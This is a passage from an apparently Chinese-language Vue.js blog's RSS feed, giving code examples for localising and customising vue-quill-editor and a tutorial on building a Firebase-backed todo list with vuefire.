  <span>font-family</span><span>:</span> <span>"FangSong"</span><span>;</span>
<span>}</span>
<span>.ql-font-Arial</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"Arial"</span><span>;</span>
<span>}</span>
<span>.ql-font-Times-New-Roman</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"Times New Roman"</span><span>;</span>
<span>}</span>
<span>.ql-font-sans-serif</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"sans-serif"</span><span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>场景三</p>
<p>默认的 vue-quill-editor 配置的是英文提示, 我们需要对其进行汉化处理</p>
</div>
<p>上一节的例子之中添加以下代码</p>
<div><pre><code><span><span><span>&lt;</span>style</span><span>></span></span><span><span>
<span>/* 汉化 */</span>
<span>.ql-snow .ql-tooltip[data-mode="link"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"请输入链接地址:"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-tooltip.ql-editing a.ql-action::after</span> <span>{</span>
  <span>border-right</span><span>:</span> 0px<span>;</span>
  <span>content</span><span>:</span> <span>"保存"</span> <span>!important</span><span>;</span>
  <span>padding-right</span><span>:</span> 0px<span>;</span>
<span>}</span>
<span>.ql-snow .ql-tooltip[data-mode="video"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"请输入视频地址:"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-size .ql-picker-label::before,
.ql-snow .ql-picker.ql-size .ql-picker-item::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"14px"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-size .ql-picker-label[data-value="small"]::before,
.ql-snow .ql-picker.ql-size .ql-picker-item[data-value="small"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"10px"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-size .ql-picker-label[data-value="large"]::before,
.ql-snow .ql-picker.ql-size .ql-picker-item[data-value="large"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"18px"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-size .ql-picker-label[data-value="huge"]::before,
.ql-snow .ql-picker.ql-size .ql-picker-item[data-value="huge"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"32px"</span> <span>!important</span><span>;</span>
<span>}</span>

<span>.ql-snow .ql-picker.ql-header .ql-picker-label::before,
.ql-snow .ql-picker.ql-header .ql-picker-item::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"正文"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-header .ql-picker-label[data-value="1"]::before,
.ql-snow .ql-picker.ql-header .ql-picker-item[data-value="1"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"标题1"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-header .ql-picker-label[data-value="2"]::before,
.ql-snow .ql-picker.ql-header .ql-picker-item[data-value="2"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"标题2"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-header .ql-picker-label[data-value="3"]::before,
.ql-snow .ql-picker.ql-header .ql-picker-item[data-value="3"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"标题3"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-header .ql-picker-label[data-value="4"]::before,
.ql-snow .ql-picker.ql-header .ql-picker-item[data-value="4"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"标题4"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-header .ql-picker-label[data-value="5"]::before,
.ql-snow .ql-picker.ql-header .ql-picker-item[data-value="5"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"标题5"</span> <span>!important</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-header .ql-picker-label[data-value="6"]::before,
.ql-snow .ql-picker.ql-header .ql-picker-item[data-value="6"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"标题6"</span> <span>!important</span><span>;</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>场景四</p>
<p>默认的 vue-quill-editor 设置工具栏的是没有 title 的, 我们需要对其进行设置</p>
</div>
<p>上一节的例子之中添加以下代码</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>mounted</span><span>(</span><span>)</span> <span>{</span>
    <span>// 设置工具栏的 title</span>
    <span>this</span><span>.</span><span>setToolbar</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>// 设置工具栏的 title</span>
    <span>setToolbar</span><span>(</span><span>)</span> <span>{</span>
      <span>const</span> titleConfig <span>=</span> <span>{</span>
        <span>"ql-bold"</span><span>:</span> <span>"加粗"</span><span>,</span>
        <span>"ql-color"</span><span>:</span> <span>"颜色"</span><span>,</span>
        <span>"ql-font"</span><span>:</span> <span>"字体"</span><span>,</span>
        <span>"ql-code"</span><span>:</span> <span>"插入代码"</span><span>,</span>
        <span>"ql-italic"</span><span>:</span> <span>"斜体"</span><span>,</span>
        <span>"ql-link"</span><span>:</span> <span>"添加链接"</span><span>,</span>
        <span>"ql-background"</span><span>:</span> <span>"背景颜色"</span><span>,</span>
        <span>"ql-size"</span><span>:</span> <span>"字体大小"</span><span>,</span>
        <span>"ql-strike"</span><span>:</span> <span>"删除线"</span><span>,</span>
        <span>"ql-script"</span><span>:</span> <span>"上标/下标"</span><span>,</span>
        <span>"ql-underline"</span><span>:</span> <span>"下划线"</span><span>,</span>
        <span>"ql-blockquote"</span><span>:</span> <span>"引用"</span><span>,</span>
        <span>"ql-header"</span><span>:</span> <span>"标题"</span><span>,</span>
        <span>"ql-indent"</span><span>:</span> <span>"缩进"</span><span>,</span>
        <span>"ql-list"</span><span>:</span> <span>"列表"</span><span>,</span>
        <span>"ql-align"</span><span>:</span> <span>"文本对齐"</span><span>,</span>
        <span>"ql-direction"</span><span>:</span> <span>"文本方向"</span><span>,</span>
        <span>"ql-code-block"</span><span>:</span> <span>"代码块"</span><span>,</span>
        <span>"ql-formula"</span><span>:</span> <span>"公式"</span><span>,</span>
        <span>"ql-image"</span><span>:</span> <span>"图片"</span><span>,</span>
        <span>"ql-video"</span><span>:</span> <span>"视频"</span><span>,</span>
        <span>"ql-clean"</span><span>:</span> <span>"清除字体样式"</span><span>,</span>
      <span>}</span><span>;</span>
      <span>const</span> oToolBar <span>=</span> document<span>.</span><span>querySelector</span><span>(</span><span>".ql-toolbar"</span><span>)</span><span>;</span>
      <span>const</span> aButton <span>=</span> oToolBar<span>.</span><span>querySelectorAll</span><span>(</span><span>"button"</span><span>)</span><span>;</span>
      <span>const</span> aSelect <span>=</span> oToolBar<span>.</span><span>querySelectorAll</span><span>(</span><span>"select"</span><span>)</span><span>;</span>
      aButton<span>.</span><span>forEach</span><span>(</span><span>function</span> <span>(</span><span>item</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span>item<span>.</span>className <span>===</span> <span>"ql-script"</span><span>)</span> <span>{</span>
          item<span>.</span>value <span>===</span> <span>"sub"</span> <span>?</span> <span>(</span>item<span>.</span>title <span>=</span> <span>"下标"</span><span>)</span> <span>:</span> <span>(</span>item<span>.</span>title <span>=</span> <span>"上标"</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>if</span> <span>(</span>item<span>.</span>className <span>===</span> <span>"ql-indent"</span><span>)</span> <span>{</span>
          item<span>.</span>value <span>===</span> <span>"+1"</span>
            <span>?</span> <span>(</span>item<span>.</span>title <span>=</span> <span>"向右缩进"</span><span>)</span>
            <span>:</span> <span>(</span>item<span>.</span>title <span>=</span> <span>"向左缩进"</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
          item<span>.</span>title <span>=</span> titleConfig<span>[</span>item<span>.</span>classList<span>[</span><span>0</span><span>]</span><span>]</span><span>;</span>
        <span>}</span>
      <span>}</span><span>)</span><span>;</span>
      aSelect<span>.</span><span>forEach</span><span>(</span><span>function</span> <span>(</span><span>item</span><span>)</span> <span>{</span>
        item<span>.</span>parentNode<span>.</span>title <span>=</span> titleConfig<span>[</span>item<span>.</span>classList<span>[</span><span>0</span><span>]</span><span>]</span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>场景五</p>
<p>默认的 vue-quill-editor 设置工具栏的是没有对图片进行限制大小处理的, 我们需要重写上传图片的监听</p>
</div>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>editorOption</span><span>:</span> <span>{</span>
        <span>modules</span><span>:</span> <span>{</span>
          <span>toolbar</span><span>:</span> <span>{</span>
            <span>handlers</span><span>:</span> <span>{</span>
              <span>// 重写图片上传监听方法, 用于控制上传图片大小和图片类型</span>
              <span>image</span><span>:</span> <span>(</span><span>value</span><span>)</span> <span>=></span> <span>{</span>
                <span>if</span> <span>(</span>value<span>)</span> <span>{</span>
                  <span>this</span><span>.</span><span>doUpload</span><span>(</span><span>"image"</span><span>)</span><span>;</span>
                <span>}</span> <span>else</span> <span>{</span>
                  <span>this</span><span>.</span>editor<span>.</span><span>format</span><span>(</span><span>"image"</span><span>,</span> <span>false</span><span>)</span><span>;</span>
                <span>}</span>
              <span>}</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>doUpload</span><span>(</span><span>type</span><span>)</span> <span>{</span>
      <span>const</span> input <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"input"</span><span>)</span><span>;</span>
      input<span>.</span><span>setAttribute</span><span>(</span><span>"type"</span><span>,</span> <span>"file"</span><span>)</span><span>;</span>
      <span>// 新建img标签, 判断是图片还是视频</span>
      <span>if</span> <span>(</span>type <span>===</span> <span>"image"</span><span>)</span> <span>{</span>
        <span>// 控制图片的类型</span>
        input<span>.</span><span>setAttribute</span><span>(</span><span>"accept"</span><span>,</span> <span>"image/*"</span><span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        input<span>.</span><span>setAttribute</span><span>(</span><span>"accept"</span><span>,</span> <span>"video/*"</span><span>)</span><span>;</span>
      <span>}</span>
      input<span>.</span><span>click</span><span>(</span><span>)</span><span>;</span>
      input<span>.</span><span>addEventListener</span><span>(</span><span>"change"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        <span>const</span> files <span>=</span> input<span>.</span>files<span>;</span>
        <span>if</span> <span>(</span>type <span>===</span> <span>"image"</span><span>)</span> <span>{</span>
          <span>// 控制图片的大小</span>
          <span>if</span> <span>(</span>files<span>[</span><span>0</span><span>]</span> <span>&amp;&amp;</span> files<span>[</span><span>0</span><span>]</span><span>.</span>size <span>></span> <span>this</span><span>.</span>imageSize <span>*</span> <span>1024</span> <span>*</span> <span>1024</span><span>)</span> <span>{</span>
            <span>this</span><span>.</span>$message<span>.</span><span>warning</span><span>(</span><span><span>`</span><span>上传的图片大小不能超过</span><span><span>${</span><span>this</span><span>.</span>imageSize<span>}</span></span><span>M</span><span>`</span></span><span>)</span><span>;</span>
          <span>}</span> <span>else</span> <span>{</span>
            <span>// 这边也可以做上传到图片服务器</span>
            <span>this</span><span>.</span><span>getBase64</span><span>(</span>files<span>[</span><span>0</span><span>]</span><span>,</span> <span>(</span><span>res</span><span>)</span> <span>=></span> <span>{</span>
              <span>const</span> editor <span>=</span> <span>this</span><span>.</span>editor<span>;</span>
              <span>const</span> index <span>=</span> editor<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span>index<span>;</span> <span>// 获取当前的光标的位置</span>
              <span>// 插入图片</span>
              editor<span>.</span><span>insertEmbed</span><span>(</span>index<span>,</span> <span>"image"</span><span>,</span> res<span>)</span><span>;</span>
              <span>// 调整光标到最后</span>
              editor<span>.</span><span>setSelection</span><span>(</span>index <span>+</span> <span>1</span><span>)</span><span>;</span>
            <span>}</span><span>)</span><span>;</span>
          <span>}</span>
        <span>}</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Vue.js 中使用 vuefire 和 firebase</title>
      <link>https://vxhly.github.io/views/vuejs/usage-vuefire-and-firebase-on-vue-js.html</link>
      <guid>https://vxhly.github.io/views/vuejs/usage-vuefire-and-firebase-on-vue-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Vue.js 中使用 vuefire 和 firebase</source>
      <description>前言
Vue.js 中使用 vuefire 和 firebase 的入坑笔记。

</description>
      <category>vuejs</category>
      <pubDate>Thu, 21 Nov 2019 11:12:31 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Vue.js 中使用 vuefire 和 firebase 的入坑笔记。</p>
</div>

<h2 id="firebase-简介" tabindex="-1"> firebase 简介</h2>
<div><p>简介</p>
<p>Firebase 是 Google Cloud Platform 为开发者设计, 提供各种工具, 解决基础架构的问题。Firebase 提供基础性工作和工具, 从而允许开发者专注于开发优质应用和扩大用户群。</p>
</div>
<h2 id="在-vue-js-中使用" tabindex="-1"> 在 Vue.js 中使用</h2>
<div><pre><code><span>npm</span> i vuefire firebase
</code></pre><div aria-hidden="true"><div></div></div></div><p>在你的 firebase 控制台中获取你的 firebase 配置参数, 并且形成形如下面的配置文件</p>
<p><code>firebase.config.js</code></p>
<div><pre><code><span>export</span> <span>const</span> firebaseConfig <span>=</span> <span>{</span>
  <span>apiKey</span><span>:</span> <span>""</span><span>,</span>
  <span>authDomain</span><span>:</span> <span>""</span><span>,</span>
  <span>databaseURL</span><span>:</span> <span>""</span><span>,</span>
  <span>projectId</span><span>:</span> <span>""</span><span>,</span>
  <span>storageBucket</span><span>:</span> <span>""</span><span>,</span>
  <span>messagingSenderId</span><span>:</span> <span>""</span><span>,</span>
  <span>appId</span><span>:</span> <span>""</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="引入-vuefire" tabindex="-1"> 引入 vuefire</h3>
<p>在 <code>main.js</code> 中插入以下的代码</p>
<div><pre><code><span>import</span> <span>{</span> firestorePlugin <span>}</span> <span>from</span> <span>"vuefire"</span><span>;</span>
Vue<span>.</span><span>use</span><span>(</span>firestorePlugin<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="连接到-firebase" tabindex="-1"> 连接到 firebase</h3>
<p>新建并在 <code>firebase.js</code> 中加入以下代码</p>
<div><pre><code><span>import</span> <span>{</span> initializeApp <span>}</span> <span>from</span> <span>"firebase/app"</span><span>;</span>
<span>import</span> <span>"firebase/firestore"</span><span>;</span>
<span>import</span> <span>{</span> firebaseConfig <span>}</span> <span>from</span> <span>"@/firebase.config"</span><span>;</span>

<span>const</span> app <span>=</span> <span>initializeApp</span><span>(</span>firebaseConfig<span>)</span><span>;</span>
<span>export</span> <span>const</span> db <span>=</span> app<span>.</span><span>firestore</span><span>(</span><span>)</span><span>;</span>
<span>export</span> <span>const</span> todosCollection <span>=</span> db<span>.</span><span>collection</span><span>(</span><span>"todos"</span><span>)</span><span>;</span> <span>// 导出你拥有的 collection</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="实现-curd" tabindex="-1"> 实现 CURD</h2>
<p>新建一个 <code>vue</code> 文件, 然后就可以参考以下的代码来写你的业务逻辑</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span><span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>todo-header<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>todo-container<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>todo-add<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>todo-add-title<span>"</span></span><span>></span></span>New ToDo:<span><span><span>&lt;/</span>div</span><span>></span></span>
        <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>todo-add-input<span>"</span></span><span>></span></span>
          <span><span><span>&lt;</span>input</span>
            <span>v-model</span><span><span>=</span><span>"</span>newTodo.content<span>"</span></span>
            <span>placeholder</span><span><span>=</span><span>"</span>new todo content<span>"</span></span>
            <span>@keyup.enter</span><span><span>=</span><span>"</span>addTodo<span>"</span></span>
          <span>/></span></span>
          <span><span><span>&lt;</span>button</span> <span>class</span><span><span>=</span><span>"</span>todo-add-btn<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>addTodo<span>"</span></span><span>></span></span>Add<span><span><span>&lt;/</span>button</span><span>></span></span>
        <span><span><span>&lt;/</span>div</span><span>></span></span>
      <span><span><span>&lt;/</span>div</span><span>></span></span>

      <span><span><span>&lt;</span>div</span>
        <span>class</span><span><span>=</span><span>"</span>todo-list<span>"</span></span>
        <span>:class</span><span><span>=</span><span>"</span>{ <span>'</span>todo-list-center<span>'</span>: todos.length === 0 }<span>"</span></span>
      <span>></span></span>
        <span><span><span>&lt;</span>template</span> <span>v-if</span><span><span>=</span><span>"</span>todos.length > 0<span>"</span></span><span>></span></span>
          <span><span><span>&lt;</span>section</span>
            <span>class</span><span><span>=</span><span>"</span>todo-list-item<span>"</span></span>
            <span>v-for</span><span><span>=</span><span>"</span>(item, index) in todos<span>"</span></span>
            <span>:key</span><span><span>=</span><span>"</span>index<span>"</span></span>
          <span>></span></span>
            <span><span><span>&lt;</span>template</span> <span>v-if</span><span><span>=</span><span>"</span>currentlyEditing === item.id<span>"</span></span><span>></span></span>
              <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>todo-edit-input<span>"</span></span><span>></span></span>
                <span><span><span>&lt;</span>span</span> <span>class</span><span><span>=</span><span>"</span>todo-edit-input-label<span>"</span></span><span>></span></span>Edit: <span><span><span>&lt;/</span>span</span><span>></span></span>
                <span><span><span>&lt;</span>input</span>
                  <span>v-model</span><span><span>=</span><span>"</span>item.content<span>"</span></span>
                  <span>placeholder</span><span><span>=</span><span>"</span>edit todo content<span>"</span></span>
                  <span>@keyup.enter</span><span><span>=</span><span>"</span>updateTodo(item)<span>"</span></span>
                <span>/></span></span>
                <span><span><span>&lt;</span>button</span> <span>class</span><span><span>=</span><span>"</span>todo-add-btn<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>updateTodo(item)<span>"</span></span><span>></span></span>
                  Save
                <span><span><span>&lt;/</span>button</span><span>></span></span>
              <span><span><span>&lt;/</span>div</span><span>></span></span>
            <span><span><span>&lt;/</span>template</span><span>></span></span>
            <span><span><span>&lt;</span>template</span> <span>v-else</span><span>></span></span>
              <span><span><span>&lt;</span>checkbox</span>
                <span>:checked</span><span><span>=</span><span>"</span>item.isComplete<span>"</span></span>
                <span>:defaultChecked</span><span><span>=</span><span>"</span>item.isComplete<span>"</span></span>
                <span>@change</span><span><span>=</span><span>"</span>onChange($event, item)<span>"</span></span>
              <span>></span></span>
                {{ item.content }}
              <span><span><span>&lt;/</span>checkbox</span><span>></span></span>
              <span><span><span>&lt;</span>div</span><span>></span></span>
                <span><span><span>&lt;</span>img</span>
                  <span>class</span><span><span>=</span><span>"</span>todo-list-item--edit<span>"</span></span>
                  <span>src</span><span><span>=</span><span>"</span>@/assets/edit.svg<span>"</span></span>
                  <span>alt</span><span><span>=</span><span>"</span>Edit todo<span>"</span></span>
                  <span>@click</span><span><span>=</span><span>"</span>editTodo(item)<span>"</span></span>
                <span>/></span></span>
                <span><span><span>&lt;</span>img</span>
                  <span>class</span><span><span>=</span><span>"</span>todo-list-item--del<span>"</span></span>
                  <span>src</span><span><span>=</span><span>"</span>@/assets/delete.svg<span>"</span></span>
                  <span>alt</span><span><span>=</span><span>"</span>Delete todo<span>"</span></span>
                  <span>@click</span><span><span>=</span><span>"</span>deleteTodo(item)<span>"</span></span>
                <span>/></span></span>
              <span><span><span>&lt;/</span>div</span><span>></span></span>
            <span><span><span>&lt;/</span>template</span><span>></span></span>
          <span><span><span>&lt;/</span>section</span><span>></span></span>
        <span><span><span>&lt;/</span>template</span><span>></span></span>

        <span><span><span>&lt;</span>div</span> <span>v-else</span><span>></span></span>
          <span><span><span>&lt;</span>span</span><span>></span></span>No ToDo List<span><span><span>&lt;/</span>span</span><span>></span></span>
        <span><span><span>&lt;/</span>div</span><span>></span></span>
      <span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> <span>{</span> todosCollection <span>}</span> <span>from</span> <span>"@/firebase"</span><span>;</span>
<span>import</span> uuid <span>from</span> <span>"uuid"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"todoList"</span><span>,</span>

  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>todos</span><span>:</span> <span>[</span><span>]</span><span>,</span>
      <span>currentlyEditing</span><span>:</span> <span>""</span><span>,</span>
      <span>newTodo</span><span>:</span> <span>{</span>
        <span>content</span><span>:</span> <span>""</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>firestore</span><span>:</span> <span>{</span>
    <span>todos</span><span>:</span> todosCollection<span>.</span><span>orderBy</span><span>(</span><span>"createdAt"</span><span>,</span> <span>"desc"</span><span>)</span><span>,</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>onChange</span><span>(</span><span>e<span>,</span> res</span><span>)</span> <span>{</span>
      res<span>.</span>isComplete <span>=</span> e<span>.</span>target<span>.</span>checked<span>;</span>
      <span>this</span><span>.</span><span>updateTodo</span><span>(</span>res<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>editTodo</span><span>(</span><span>payload</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>currentlyEditing <span>=</span> payload<span>.</span>id<span>;</span>
    <span>}</span><span>,</span>
    <span>// 删除</span>
    <span>deleteTodo</span><span>(</span><span>payload</span><span>)</span> <span>{</span>
      todosCollection<span>.</span><span>doc</span><span>(</span>payload<span>.</span>id<span>)</span><span>.</span><span>delete</span><span>(</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>// 更新</span>
    <span>updateTodo</span><span>(</span><span>payload</span><span>)</span> <span>{</span>
      todosCollection
        <span>.</span><span>doc</span><span>(</span>payload<span>.</span>id<span>)</span>
        <span>.</span><span>update</span><span>(</span><span>{</span>
          <span>...</span>payload<span>,</span>
          <span>updatedAt</span><span>:</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getTime</span><span>(</span><span>)</span><span>,</span>
        <span>}</span><span>)</span>
        <span>.</span><span>then</span><span>(</span><span>(</span><span>_</span><span>)</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span>$message<span>.</span><span>success</span><span>(</span><span>"Update a todo item successfully !"</span><span>)</span><span>;</span>
          <span>this</span><span>.</span>currentlyEditing <span>=</span> <span>""</span><span>;</span>
        <span>}</span><span>)</span>
        <span>.</span><span>catch</span><span>(</span><span>(</span><span>error</span><span>)</span> <span>=></span> <span>{</span>
          <span>this</span><span>.</span>$message<span>.</span><span>error</span><span>(</span><span><span>`</span><span>Update a todo item is </span><span><span>${</span>error<span>}</span></span><span>!</span><span>`</span></span><span>)</span><span>;</span>
        <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>// 新增</span>
    <span>addTodo</span><span>(</span><span>)</span> <span>{</span>
      <span>const</span> <span>{</span> content <span>}</span> <span>=</span> <span>this</span><span>.</span>newTodo<span>;</span>
      <span>if</span> <span>(</span>content<span>)</span> <span>{</span>
        todosCollection
          <span>.</span><span>add</span><span>(</span><span>{</span>
            content<span>,</span>
            <span>createdAt</span><span>:</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>.</span><span>getTime</span><span>(</span><span>)</span><span>,</span>
            <span>isComplete</span><span>:</span> <span>false</span><span>,</span>
            <span>id</span><span>:</span> <span>uuid</span><span>(</span><span>)</span><span>,</span>
          <span>}</span><span>)</span>
          <span>.</span><span>then</span><span>(</span><span>(</span><span>_</span><span>)</span> <span>=></span> <span>{</span>
            <span>this</span><span>.</span>$message<span>.</span><span>success</span><span>(</span><span>"Add a todo item successfully !"</span><span>)</span><span>;</span>
            <span>this</span><span>.</span>newTodo<span>.</span>content <span>=</span> <span>""</span><span>;</span>
          <span>}</span><span>)</span>
          <span>.</span><span>catch</span><span>(</span><span>(</span><span>error</span><span>)</span> <span>=></span> <span>{</span>
            <span>this</span><span>.</span>$message<span>.</span><span>error</span><span>(</span><span><span>`</span><span>Add a todo item is </span><span><span>${</span>error<span>}</span></span><span>!</span><span>`</span></span><span>)</span><span>;</span>
          <span>}</span><span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>

<span><span><span>&lt;</span>style</span> <span>lang</span><span><span>=</span><span>"</span>scss<span>"</span></span><span>></span></span><span><span>
<span>.todo</span> <span>{</span>
  <span>-</span> <span>{</span>
    <span>line-height</span><span>:</span> 1.5<span>;</span>
  <span>}</span>
  <span>&amp;-header</span> <span>{</span>
    <span>height</span><span>:</span> 300px<span>;</span>
    <span>width</span><span>:</span> 100%<span>;</span>
    <span>background-color</span><span>:</span> #ff33ae<span>;</span>
  <span>}</span>

  <span>&amp;-container</span> <span>{</span>
    <span>width</span><span>:</span> 800px<span>;</span>
    <span>margin</span><span>:</span> 0 auto<span>;</span>
    <span>margin-top</span><span>:</span> -50px<span>;</span>
  <span>}</span>
  <span>&amp;-add</span> <span>{</span>
    <span>padding</span><span>:</span> 20px<span>;</span>
    <span>background-color</span><span>:</span> #fff<span>;</span>
    <span>border-radius</span><span>:</span> 4px<span>;</span>
    <span>box-shadow</span><span>:</span> 1px 5px 10px 0px #ededed<span>;</span>
    <span>&amp;-title</span> <span>{</span>
      <span>font-size</span><span>:</span> 20px<span>;</span>
      <span>margin-bottom</span><span>:</span> 20px<span>;</span>
